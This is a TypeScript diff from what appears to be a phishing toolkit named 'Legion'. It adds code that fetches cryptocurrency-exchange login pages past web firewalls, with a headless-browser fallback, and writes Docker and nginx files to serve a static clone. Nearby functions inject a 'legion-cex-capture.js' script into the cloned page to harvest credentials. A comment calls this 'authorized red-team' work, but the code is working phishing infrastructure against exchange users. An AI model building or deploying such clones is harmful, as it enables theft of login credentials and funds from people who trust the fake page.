@@ -178,6 +178,64 @@ export async function buildCredCaptureJs(opts: {
   return template
 }
 
+/** Fetch login HTML — WAF probe + headless fallback for Tier-S CEX targets. */
+export async function fetchCexLoginHtml(
+  target: URL,
+  outDir: string,
+): Promise<{ html: string; usedHeadless: boolean }> {
+  const { runMirrorProbePipeline } = await import('./mirror-target-pipeline.js')
+  const pipeline = await runMirrorProbePipeline(target, outDir, { force: true })
+  if (pipeline.html && pipeline.html.length > 512) {
+    return { html: pipeline.html, usedHeadless: pipeline.usedHeadless === true }
+  }
+
+  const res = await fetchWithTimeout(target.href, { headers: { Accept: 'text/html' } })
+  if (res.ok) {
+    const html = await res.text()
+    return { html, usedHeadless: false }
+  }
+  throw new Error(`Failed to fetch CEX login page: HTTP ${res.status}`)
+}
+
+export function buildCexStaticDockerCompose(hostPort = 8080): string {
+  return `# Legion CEX static clone — authorized red-team credential capture
+services:
+  cex-static:
+    image: nginx:alpine
+    container_name: legion-cex-static
+    ports:
+      - "${hostPort}:80"
+    volumes:
+      - ./:/usr/share/nginx/html:ro
+      - ./nginx-cex-static.conf:/etc/nginx/conf.d/default.conf:ro
+    restart: unless-stopped
+`
+}
+
+export function buildCexStaticNginxConfig(): string {
+  return `server {
+  listen 80;
+  server_name localhost;
+  root /usr/share/nginx/html;
+  index index.html;
+
+  location / {
+    try_files $uri $uri/ /index.html;
+    add_header Cache-Control "no-store";
+  }
+
+  location ^~ /assets/ {
+    try_files $uri =404;
+  }
+}
+`
+}
+
+export async function writeCexStaticServeFiles(outDir: string, hostPort = 8080): Promise<void> {
+  await writeFile(path.join(outDir, 'nginx-cex-static.conf'), buildCexStaticNginxConfig(), 'utf8')
+  await writeFile(path.join(outDir, 'docker-compose.yml'), buildCexStaticDockerCompose(hostPort), 'utf8')
+}
+
 export function injectCexScripts(html: string, mobileOptimize: boolean): string {
   const tags = [
     '<script src="./legion-cex-capture.js" defer></script>',
